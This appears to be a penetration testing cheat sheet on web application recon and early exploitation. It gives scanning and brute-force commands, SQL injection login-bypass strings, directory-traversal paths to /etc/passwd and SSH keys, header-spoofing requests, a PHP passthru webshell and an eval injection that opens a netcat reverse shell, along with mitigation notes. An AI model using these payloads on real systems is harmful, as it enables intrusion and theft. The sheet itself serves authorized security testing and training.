---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/web-application/basic-recon
---

# Basic Recon

Foundational recon and enumeration techniques for web application pentests. The goal of this
phase is to map out what the application is, what it's built on, and where the likely attack
surface is — before moving into targeted vulnerability testing.

## Assessment Methodology

Before touching tools, answer these:

* What does the application do? (purpose, user roles, core functionality)
* What language/framework is it written in?
* What server software is it running on?
* What's the underlying database and OS?

These answers shape every later decision — e.g. PHP + Apache points toward different attack
classes than Node.js + Nginx.

## Fingerprinting

### How to identify it
Run fingerprinting tools early; headers, error pages, and file extensions often leak the
stack outright.

### Exploitation
```bash
whatweb -v http://10.10.10.10

# HTTP header disclosure (e.g. IIS version, X-Powered-By)
nmap --script http-headers -sV -p 80 10.10.10.10
```

---

## Directory & File Enumeration

### How to identify it
Hidden admin panels, backup files, and forgotten dev endpoints are routinely found by
brute-forcing common paths and extensions — they're rarely linked from the UI.

### Exploitation

**Gobuster:**
```bash
gobuster dir -u http://10.10.10.10 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -t 50 -x .php
```

| Flag | Meaning |
|---|---|
| `-x` | specific file extension(s) to brute-force |
| `-k` | disable TLS certificate validation |
| `--exclude-length` | hide responses of a specific length (filter noise) |
| `-o` | write output to file |
| `-f` | append `/` to discovered directories |
| `-n` | suppress specific status codes |
| `-w` | wordlist path |
| `-t` | thread count |

Recommended extensions to fuzz with: `.txt .conf .html .php .asp .aspx .jsp .db .sql .exe
.config .db .bak .cgi .ps1 .py .ini .js .sh .json`

**Loop multiple base paths:**
```bash
for i in uploads dev admin test; do
  gobuster dir -u http://10.10.10.10/$i \
    -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
    -t 50 -x .php -o gobuster.$i.log
done
```

**Through a proxy (e.g. routing via Burp/SOCKS):**
```bash
proxychains gobuster dir -u http://10.10.10.10 \
  -w /usr/share/wordlists/common.txt -x html -t 50 \
  --proxy socks5://127.0.0.1:8080
```

**Dirb (with basic auth):**
```bash
dirb http://10.10.10.10/project -u admin:password
```

**Check for stray/default files manually:**
```bash
# Common locations worth checking by hand
/robots.txt
/index.[php,html,asp,aspx]
# Hitting a random nonexistent path can also reveal a custom error page leaking the stack
/randomthing-get-error
```

---

## Vulnerability Scanning

### How to identify it
Automated scanners catch known CVEs and misconfigurations fast — run them early to avoid
manually rediscovering well-known issues.

### Exploitation
```bash
nikto -h http://10.10.10.10
nikto -h http://10.10.10.10 -o nikto.html -Format htm

# CMS-specific: WordPress
wpscan --url http://10.10.10.10 --enumerate ap,at,cb,dbe
```

For WordPress specifically, also check the rendered page source for installed plugins —
many are individually exploitable even when WordPress core itself is patched.

---

## WebDAV

### How to identify it
```bash
nmap --script http-webdav-scan --script-args http-methods.url-path=/webdav/ 10.10.10.10

# Confirm allowed HTTP methods (PUT enabled is the key signal)
nmap --script http-methods --script-args http-methods.url-path=/webdav/ 10.10.10.10
```

### How it works
WebDAV extends HTTP with methods like `PUT` and `PROPFIND` for remote file management. If
write access is misconfigured (weak/no auth), you can upload a webshell directly.

### Exploitation
```bash
# Enumerate what's exploitable
davtest -url http://10.10.10.10/webdav
davtest -auth bob:password_123 -url http://10.10.10.10/webdav

# Upload a webshell interactively
cadaver http://10.10.10.10/webdav
put /usr/share/webshells/asp/webshell.asp
```

### Mitigation
Disable WebDAV `PUT`/`DELETE` methods unless explicitly required; enforce auth on all WebDAV
endpoints; restrict uploadable file extensions at the web server level.

---

## Default Credentials & Auth Bypass

> This content overlaps with the planned [auth-bypass.md](auth-bypass.md) topic.

### How to identify it
Always check for default/weak credentials before attempting injection — it's the cheapest
win and often overlooked even in hardened apps.

### Exploitation

**Default creds to try:**
```
admin/admin
admin/password
admin/<machine-name>
<machine-name>/<machine-name>
```
Also search the vendor/product name + "default credentials" on Google, and brute-force with
Hydra if a small candidate list doesn't land.

**Username enumeration via differential responses:**
```bash
wfuzz -c -w /usr/share/seclists/Usernames/Names/names.txt \
  -d "username=FUZZ&password=anything" \
  -hs "No Account found with that username" \
  http://10.10.10.10/login.php
```

**SQL injection auth bypass — entry point characters to test in the username field:**
```
' '' ` ') ") `) ')) ")) `))
```

**Password field (no real injection, just logic abuse):**
```
' || ''=='
```

**Classic bypass payloads:**
```
admin' or 1==1
' or 1=1 -- -
' || 1=1 -- -
```

**Array-type parameter confusion** (some frameworks mishandle array input where a string is
expected, sometimes bypassing comparison logic):
```
username=admin&password[]=
```

### Mitigation
Enforce strong default-credential rotation on deployment; use parameterized queries everywhere
(eliminates the injection-based bypasses entirely); rate-limit and lock out repeated failed
logins to blunt enumeration/brute-force.

---

## Local File Inclusion / Directory Traversal

> This content overlaps with the planned [lfi-rfi.md](lfi-rfi.md) topic.

### How to identify it
Any parameter that looks like it controls a filename or path (`file=`, `page=`, `template=`,
`include=`) is worth testing — especially in apps written in PHP.

### How it works
If user input is concatenated into a filesystem path without sanitization, you can traverse
out of the intended directory and read (or in PHP, sometimes execute) arbitrary files.

### Exploitation
```bash
# Absolute path
?file=/etc/passwd

# Relative traversal — try increasing depth until it lands
?file=../../../etc/passwd
?file=../../../../etc/passwd

# High-value targets once you have read access
?file=../../../../var/log/apache2/access.log    # log poisoning → RCE potential
?file=../../../../var/www/html/index.php          # source disclosure
```

Reading **SSH keys** or service config files via LFI is a common pivot to further access.
Reading **application config files** (`.env`, `dbconfig.php`, etc.) is a common pivot to RCE —
see the [Symfony APP_SECRET → RCE chain] pattern as an example of where this leads.

### Mitigation
Never pass user input directly into filesystem functions; use a strict allow-list of valid
filenames/IDs instead of raw paths; run the web process with least-privilege filesystem access.

---

## HTTP Request Manipulation

### How to identify it
Test header-based filter bypasses whenever you encounter an IP allow-list, geofence, or
"internal only" restriction on an endpoint.

### Exploitation
```bash
# Confirm a 200 OK and follow redirects on discovered paths
curl -I -L google.com

# Spoof User-Agent (bypass UA-based filtering)
curl -H "User-Agent: Mozilla Firefox" http://10.10.10.10/secret

# Bypass IP allow-list checks via spoofed header
curl http://10.10.10.10:13337/logs -H "X-Forwarded-For: localhost"
curl "http://10.10.10.10:13337/logs?file=/etc/passwd" -H "X-Forwarded-For: localhost"

# POST with spoofed header + JSON body
curl -X POST http://10.10.10.10:13337/update \
  -H "Content-Type: application/json" \
  -H "X-Forwarded-For: localhost" \
  --data '{"user":"admin","url":"http://10.10.10.10/shell"}'

# Empty POST body still sends Content-Length: 0 — useful to probe endpoint behavior
curl -d "" -X POST http://10.10.10.10:33333/list-current-deployments

# Same technique through a proxy chain, with a command injection payload
proxychains curl -X POST --data "data=ls" -H 'X-Forwarded-For: 127.0.0.1' \
  http://10.10.10.10/cmd.php
```

### Mitigation
Never trust client-supplied headers (`X-Forwarded-For`, `User-Agent`, etc.) for access
control decisions — validate at the network/infrastructure layer instead.

---

## Post-Authentication Checklist

Once you have valid credentials or an authenticated session, work through:

* Check the disclosed software **version** against Exploit-DB / CVE databases
* Test **file upload** functionality for webshell upload
* Check whether **user privilege** can change after login (privilege escalation in-app)
* Look for direct **code execution** via post/page creation features
* Enumerate installed **modules / extensions / addons** — and whether you can install your own malicious one
* Check CMS admin panels for **stored credentials** to underlying databases
* Look for **scheduled job** functionality (cron-like features) — often executes with elevated privilege
* Check for **diagnostic/debug tools** that allow system-level command execution
* Review exposed **configuration file** editors
* Test whether existing PHP files can be **modified or have code injected**

### Exploitation

**Direct PHP webshell drop (if file write achieved):**
```php
<?php
<pre>
passthru($_GET['cmd']);
</pre>
?>
```

**Eval injection via page parameter (PHP, common in older CMS template engines):**
```
page=index');eval('phpinfo();');#
page=index');eval("(system('nc 10.10.10.10 443 -e /bin/bash');");#
```

### Mitigation
Disable dangerous functions (`eval`, `passthru`, `system`, `exec`) in production PHP configs
where not strictly required; enforce strict file-upload type/content validation; run scheduled
jobs with least privilege; audit all admin-accessible code-editing features.

---

## DNS / Network Layer

### How to identify it
Don't skip infrastructure-level recon — hostname info and zone transfers can reveal internal
naming conventions or additional hosts not visible from the web app alone.

### Exploitation
```bash
nmap --script http-enum -sV -p 80 10.10.10.10
```
Also check for DNS zone transfer misconfigurations on any identified nameservers, and note
hostnames/vhosts that might indicate other applications sharing the same infrastructure.
